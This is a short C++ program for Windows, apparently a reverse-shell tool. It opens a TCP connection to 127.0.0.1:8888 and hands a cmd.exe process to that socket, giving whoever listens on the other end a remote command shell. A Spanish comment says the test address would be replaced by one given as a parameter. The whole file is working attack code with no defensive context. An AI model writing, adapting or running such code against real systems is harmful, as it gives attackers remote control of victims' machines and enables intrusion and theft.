#include<stdio.h>
#include<winsock2.h>
#include<string>
#include<iostream>
#include "exec.h"
#include <windows.h>

#pragma comment(lib,"ws2_32.lib") 
 
int main(int argc , char *argv[])
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    std::string messages;
    char recvbuf[4096];
    int recvbuflen = 4096;
    std::string res;
    std::string recvbuf1;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
 
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
    
    printf("Initialised.\n");
    

    if((s = WSASocket(AF_INET , SOCK_STREAM , IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError());
    }
 
    printf("Socket created.\n");
    
    
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Dirección de prueba, esta la recibiría como parámetro
    server.sin_family = AF_INET;
    server.sin_port = htons( 8888 );

    if (WSAConnect(s , (struct sockaddr *)&server , sizeof(server), NULL, NULL, NULL, NULL) < 0)
    {
        puts("connect error");
        return 1;
    } puts("Connected");
    
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s;
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    WSACleanup();
    
    
    
 
    exit(0);
}